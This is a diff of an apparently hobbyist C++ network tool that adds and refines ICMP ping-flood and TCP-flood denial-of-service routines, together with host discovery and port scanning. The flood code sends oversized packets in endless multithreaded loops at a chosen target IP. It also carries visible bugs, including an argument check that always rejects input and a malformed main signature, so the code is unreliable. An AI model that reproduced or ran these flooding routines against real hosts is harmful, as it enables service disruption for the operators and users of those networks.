@@ -87,34 +87,34 @@ bool ip_response(const char *ip){
         
             if(bytes <= 0){
                 close(sock);
-                return false;
+                return false;   
             }
+            //Math calc for ICMP
             struct iphdr *ip_header = (struct iphdr *)buffer_respost;
             int header_len = ip_header->ihl * 4;
 
             struct icmphdr *reply = (struct icmphdr *)(buffer_respost + header_len);
+            // Filter
+            if(reply->type == ICMP_ECHOREPLY && reply->un.echo.id == htons(1234)){
+                
+                char d[INET_ADDRSTRLEN];
+                inet_ntop(AF_INET, &sender.sin_addr, d, INET_ADDRSTRLEN);
 
-        if(reply->type == ICMP_ECHOREPLY && reply->un.echo.id == htons(1234)){
+                std::string s1 = ip;
+                std::string s2 = d;
+
             
-            char d[INET_ADDRSTRLEN];
-            inet_ntop(AF_INET, &sender.sin_addr, d, INET_ADDRSTRLEN);
-
-            std::string s1 = ip;
-            std::string s2 = d;
-
-        
-            if (s1 == s2) {
-            close(sock);
-            return true;
-            } 
-            else {
-                continue; 
+                if (s1 == s2) {
+                close(sock);
+                return true;
+                } 
+                else {
+                    continue; 
+                }
             }
-        }
         }
     }
     
-        
 }
 
 std::mutex print_lock;
@@ -160,7 +160,6 @@ void show_ips(const char * ip_range, int CIDR ){
         if(t.joinable()) t.join();
     }
 }
-
 
 
 bool scanPort(const char  *ip, int port){
@@ -254,7 +253,8 @@ void ping_flood(const char *ip, int size){
     struct sockaddr_in target;
     target.sin_family = AF_INET;
     inet_pton(AF_INET, ip, &target.sin_addr);
-
+    
+    //Big spider aloc 
     int big_spider = sizeof(struct icmphdr) + size;   
     char *package = new char[big_spider];
     memset(package, 'X', big_spider);
@@ -279,60 +279,85 @@ void ping_flood(const char *ip, int size){
     while (true)
     {
         
-    sendto(sock, package, big_spider, 0, (struct sockaddr*)&target, sizeof(target));
+     sendto(sock, package, big_spider, 0, (struct sockaddr*)&target, sizeof(target));
                 
     }
  
 }
-
-void dOS ( int th, const char *ip, int port, int type ){
+//Pardao th 100
+void dOS ( int th, const char *ip, int type ){
     if( type != 1 || type != 2){
+        fprintf(stderr, "Invalid number or argument, 1. Tcp flood, 2. Ping flood");
         return;
     }
 
-   std::vector<std::thread> spiders;
+    std::vector<std::thread> spiders;
    
-   if(type == 1){
-        printf("[*] Type %s tcp-flood ", type); 
+    if(type == 1){
+    
+        int port = 0; 
+        printf("[-] Enter with the port: \n");
+        scanf("%i", &port);
+        
+        printf("[*] Type [%i] tcp-flood \n", type);
+        printf("[*] Number of threads: [%i] \n", th);
+        printf("[*] Send packages. . . .\n");
 
         for(int i = 0; i < th; i ++){
-        spiders.emplace_back(tcp_flood, ip, port);
+           spiders.emplace_back(tcp_flood, ip, port);
         
         }
-   }else{
+
+    }else{
         int size = 0;
         
-        printf("[*] What number of spiders to attack ? (MAX number = 2^{16} -1 )");
-        scanf("%i ", &size);
+        printf("[*] What number of spiders to attack ? (MAX number = 2^{16} -1 ) \n");
+        scanf("%i", &size);
        
-        if(size > 65535){
-            printf("[*] Max number");
+        if(size > 65507){
+            fprintf(stderr,"[*] Limit of spiders: %i \n", 65507);
             return;
             
         }else{
-            printf("[*] BIG SPIDER ATCK ");
+            printf("[*] BIG SPIDER ATCK \n");
 
             for(int i = 0; i < th; i ++){
                 spiders.emplace_back(ping_flood, ip, size);
     
             }
-            
-            
-            printf("");
-
-
         }
     }   
-   for(auto& t : spiders){
+    for(auto& t : spiders){
         if(t.joinable()){
             t.join();
         }
-   }
+    }
     
 }
+std::string process_info(const char * ip, int port){
 
-void spider(){
-    
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    struct sockaddr_in host;
+    host.sin_family = AF_INET;
+    host.sin_port = htons(port);
+    inet_pton(AF_INET, ip, &host.sin_addr );
+
+    int connection = connect(sock, (struct sockaddr*)&host, sizeof(host) );
+
+    if(connection < 0){
+        fprintf(stderr, "Connection refused");
+    }
+    else{
+        
+    }
+
+
+
+}
+
+void spider_name(){
+
     printf(
     " ____        _     _           _   _ _____ _____ \n"
     "/ ___| _ __ (_) __| | ___ _ __| \\ | | ____|_   _|\n"
@@ -341,6 +366,9 @@ void spider(){
     "|____/| .__/|_|\\__,_|\\___|_|  |_| \\_|_____| |_|  \n"
     "      |_|                                         \n"
     );
+}
+void spider(){
+    
     printf(
     "           ;               ,           \n"
     "         ,;                 '.         \n"
@@ -378,8 +406,7 @@ void spider(){
     
 }
 
-
-int main(){
+int main( int argv, char *argc){
     
    // char ip [16] = "192.168.5.164";
     //show_ips(ip, 24);
